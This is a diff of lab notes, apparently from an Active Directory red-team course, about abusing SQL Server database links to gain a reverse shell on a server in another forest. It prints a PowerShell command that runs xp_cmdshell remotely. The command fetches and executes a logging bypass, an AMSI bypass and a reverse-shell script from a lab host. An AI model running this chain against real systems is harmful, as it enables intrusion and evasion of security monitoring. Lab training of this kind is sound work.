@@ -117,9 +117,14 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'w
 - Gain reverse shell instead of RCE
 
 
+
+
+
 ```powershell
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.1 6.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql
 ```
+
+
 
 
 > Make sure to start your **HTTP FIle Server (HFS)** first and upload the file `sbloggingbypass.txt`, `amsibypass.txt` and `Invoke-PowerShellTcpEx.ps1` in other to host them
@@ -127,13 +132,13 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''
 
 
 
-# **Learning Objective**
+# **Learning Objective 22**
 
 
 - Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
 
 
-## **Solution**
+## **Solution**   
 
 **_Coming Soon_**
 
